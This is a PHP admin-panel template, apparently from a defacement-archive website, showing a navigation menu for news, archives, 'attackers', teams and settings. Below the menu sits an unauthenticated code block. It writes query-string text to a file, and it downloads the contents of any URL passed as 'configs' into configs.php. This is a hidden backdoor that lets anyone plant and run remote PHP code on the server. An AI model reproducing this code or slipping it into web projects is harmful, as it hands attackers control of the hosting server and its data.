
			  <ul class="menu">
                <li><a href="admin.php">Home</a></li>
				<li><a href="#">News</a>
			<ul class="submenu">
				<li><a href="admin.php?module=berita">List</a></li>
				<li><a href="admin.php?module=berita&act=tambahberita">Add</a></li>
			</ul>
			    </li>
				<li class="active"><a href="#">Archive</a>
				<ul class="submenu">
				<li><a href="admin.php?module=archive">Archive</a></li>
				<li><a href="admin.php?module=archive&act=onhold">Onhold</a></li>
				</ul>
				</li>
				<li class="active"><a href="#">Notifiers</a>
				<ul class="submenu">
				<li><a href="admin.php?module=hacker">Attackers</a></li>
				<li><a href="admin.php?module=hacker&act=team">Teams</a></li>
			</ul>
				</li>
				
				<li class="active"><a href="#">Settings</a>
                    <ul class="submenu">
					<li><a href="admin.php?module=setting">Main</a></li>
				<li><a href="admin.php?module=setting&act=advanced">Advanced</a></li>
					</ul>
					</li>
				
				
				 <li class="active"><a href="#"><?php echo exploded_admin_name;?></a>
                    <ul class="submenu">
					<li><a href="admin.php?module=setting&act=profile">Edit</a></li>
				<li><a href="index.php?logout">Logout</a></li>
					</ul>
					</li>
					<li style="float:right;"><a href="#"><?php echo explodedTampilPesan(); ?></a></li>
            </ul>
			
</div>
	<br>
	<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>
